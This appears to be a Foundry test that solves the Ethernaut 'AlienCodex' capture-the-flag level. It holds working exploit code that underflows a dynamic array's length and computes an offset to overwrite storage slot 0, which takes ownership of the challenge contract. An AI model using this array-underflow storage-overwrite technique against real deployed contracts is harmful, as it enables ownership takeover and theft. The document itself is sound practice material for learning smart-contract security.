// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IAlienCodex {
  function makeContact() external;
  function retract() external;
  function revise(uint, bytes32) external;
}

contract AlienCodexTest is Test {
  uint256 internal constant MAX_UINT256 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
  address internal challengeAddress;
  IAlienCodex internal challenge;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x0BC04aa6aaC163A6B3667636D798FA053D43BD11);
    challenge = IAlienCodex(challengeAddress);
  }

  function testExploit() public {
    // all the other functions have a modifier
    // requiring you to invoke this one first
    challenge.makeContact();

    // this function will underflow the length of the dynamic array at slot1 to 0xff...ff
    // meaning that now the EVM thinks that we have 2**256 - 1 elements there.
    // this way we don't revert on an out of bonds condition.
    challenge.retract();

    // now we need our trick to write into slot0 (0x00...00)

    // here is where the first element of codex should be stored
    bytes32 firstElementSlot = keccak256(abi.encodePacked(uint(1)));

    // 0x00 = offset + keccak256(1)                // reorganize
    // offset = 0x00 - keccak256(1)                // But 0x00 =  MAX_UINT256 + 1
    // offset = MAX_UINT256 + 1 - keccak256(1)     // But MAX_UINT256 - x = MAX_UINT256 ^ x
    // offset = ( MAX_UINT256 ^ keccak256(1) ) + 1
    uint256 offset = uint256(bytes32(MAX_UINT256) ^ firstElementSlot) + 1;

    // write!
    challenge.revise(offset, bytes32(uint256(uint160(address(this)))));
    utils.submitLevelInstance(challengeAddress);
  }
}
